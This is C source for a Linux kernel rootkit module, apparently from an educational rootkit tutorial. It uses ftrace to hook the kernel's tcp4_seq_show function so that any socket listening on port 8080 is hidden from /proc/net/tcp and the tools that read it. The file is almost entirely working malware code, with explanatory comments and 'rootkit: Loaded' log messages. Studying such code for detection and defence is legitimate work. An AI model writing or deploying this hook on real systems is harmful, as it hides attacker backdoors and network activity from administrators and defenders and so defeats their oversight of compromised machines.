#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding open ports");
MODULE_VERSION("0.01");

/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	long ret;
	struct sock *sk = v;

	/* 0x1f90 = 8080 in hex */
	if (sk != (struct sock *)0x1 && sk->sk_num == 0x1f90)
	{
		printk(KERN_DEBUG "rootkit: Found process listening on port 8080 - hiding!\n");
		return 0;
	}
	
	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

/* We are going to use the fh_install_hooks() function from ftrace_helper.h
 * in the module initialization function. This function takes an array of 
 * ftrace_hook structs, so we initialize it with what we want to hook
 * */
static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Simply call fh_install_hooks() with hooks (defined above) */
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Simply call fh_remove_hooks() with hooks (defined above) */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
